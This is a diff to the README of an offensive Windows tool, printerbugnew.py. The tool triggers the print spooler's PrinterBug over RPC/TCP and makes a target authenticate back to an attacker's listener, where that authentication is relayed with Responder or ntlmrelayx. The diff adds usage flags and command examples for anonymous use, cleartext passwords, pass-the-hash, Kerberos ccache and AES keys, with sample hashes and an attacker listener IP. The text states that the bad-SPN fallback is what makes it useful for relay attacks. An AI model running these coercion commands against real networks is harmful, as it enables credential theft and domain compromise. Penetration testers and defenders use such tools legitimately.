@@ -4,38 +4,65 @@
 
 ## Usage
 ```
-printerbugnew.py <target_host> [username] [password] [domain] [attacker_host] [tcp_port]
+uv run --with impacket printerbugnew.py -t TARGET [-u USERNAME] [-p PASSWORD]
+                                         [-H NTHASH] [-d DOMAIN] [-l LISTENER]
+                                         [-k] [--ccache FILE] [--aes-key HEXKEY]
+                                         [--dc-ip IP] [--port PORT]
 ```
+
+| Flag | Description |
+|------|-------------|
+| `-t` | Target hostname or IP. Use FQDN with Kerberos for correct SPN resolution. |
+| `-u` | Username |
+| `-p` | Plaintext password |
+| `-H` | NT hash for pass-the-hash |
+| `-d` | Domain |
+| `-l` | Listener IP/host for the backconnect (default: target) |
+| `-k` | Use Kerberos authentication |
+| `--ccache` | Path to ccache file — sets `KRB5CCNAME`, implies `-k` |
+| `--aes-key` | AES128/256 key for Kerberos auth, implies `-k` (useful when RC4/NTLM is disabled) |
+| `--dc-ip` | Domain controller / KDC IP |
+| `--port` | Specific spoolss RPC/TCP port — omit to query EPM automatically |
 
 ## Examples
 
-### Anonymous connection
+### Anonymous
 ```bash
-printerbugnew.py 192.168.1.100
+uv run --with impacket printerbugnew.py -t 10.10.11.50 -l 10.10.14.5
 ```
 
-### With credentials
+### Cleartext credentials
 ```bash
-printerbugnew.py 192.168.1.100 admin Password123 DOMAIN
+uv run --with impacket printerbugnew.py -t 10.10.11.50 -u Administrator -p ‘P@ssw0rd’ -d CORP -l 10.10.14.5
 ```
 
-### Trigger backconnect to different host (attacker)
+### Pass-the-hash
 ```bash
-printerbugnew.py 192.168.1.100 admin Password123 DOMAIN 192.168.1.50
+uv run --with impacket printerbugnew.py -t 10.10.11.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP -l 10.10.14.5
 ```
 
-### Use specific RPC port
+### Kerberos with ccache
 ```bash
-printerbugnew.py 192.168.1.100 admin Password123 DOMAIN 192.168.1.50 49152
+uv run --with impacket printerbugnew.py -t wmc-ca.corp.local -u ‘SVC$’ -d CORP --ccache svc.ccache --dc-ip 10.10.11.1 -l 10.10.14.5
+```
+
+### Kerberos with AES key (RC4/NTLM disabled environments)
+```bash
+uv run --with impacket printerbugnew.py -t wmc-ca.corp.local -u ‘SVC$’ -d CORP --aes-key 1d313c73ad2864ad8102776b891f0616bd3cf03ac459a7d6da2f4cce36dc94ec --dc-ip 10.10.11.1 -l 10.10.14.5
+```
+
+### Specific RPC port (skip EPM lookup)
+```bash
+uv run --with impacket printerbugnew.py -t 10.10.11.50 -u svc -H aad3b435b51404eeaad3b435b51404ee -d CORP -l 10.10.14.5 --port 49152
 ```
 
 ## Notes
 - Target must be Windows 11 22H2+ or Server 2025 (RPC over TCP default)
 - For older versions, spoolss uses RPC over Named Pipes (SMB)
 - Ensure ports 135 and dynamic RPC ports (49152-65535) are open
-- Start Responder or ntlmrelayx on attacker_host to capture auth
-- Kerberos fails in this case due to a bad SPN from the spooler, forcing NTLM fallback.
-- Find the target spooler’s RPC/TCP port by querying the target Endpoint Mapper (EPM) on TCP/135 for the interface UUID 12345678-1234-abcd-ef00-0123456789ab. You can use rpcdump.py, PortQry, or any tool you prefer - or just implement the EPM lookup directly in this code ;)
+- Start Responder or ntlmrelayx on the listener host to capture auth
+- The spooler uses a bad SPN when connecting back to the listener, forcing NTLM fallback — this is what makes it useful for relay attacks
+- The EPM is queried automatically on TCP/135 for the RPRN interface UUID (`12345678-1234-abcd-ef00-0123456789ab`); use `--port` to skip the lookup
 - Based on https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
   <br><br>
   <img width="2019" height="657" alt="image" src="https://github.com/user-attachments/assets/84e8955e-c6ca-46de-abc8-b75829e259cc" />
